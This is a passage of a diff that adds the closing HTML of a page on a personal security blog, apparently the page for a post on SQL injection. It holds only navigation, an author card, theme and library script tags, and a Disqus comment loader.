+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/xss/" data-tooltip="XSS">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+    
+    <h4 id="about-card-name">Zor01478</h4>
+    
+      <div id="about-card-bio">戴了头盔，所以头很铁</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Sec
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        杭州
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    <div id="cover" style="background-image:url('https://gitee.com/zor01478/blog-picture/raw/master/images/qianyang.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://Zor01478.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+  
+    <script src="https://Zor01478.github.io/js/clicklove.js"></script>
+  
+
+  
+    <script src="https://Zor01478.github.io/js/snow.js"></script>
+  
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/Zor01478.github.io\/2021\/02\/sql%E6%B3%A8%E5%85%A5\/';
+          
+            this.page.identifier = '\/2021\/02\/sql%E6%B3%A8%E5%85%A5\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'hugo-tranquilpeak-theme';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
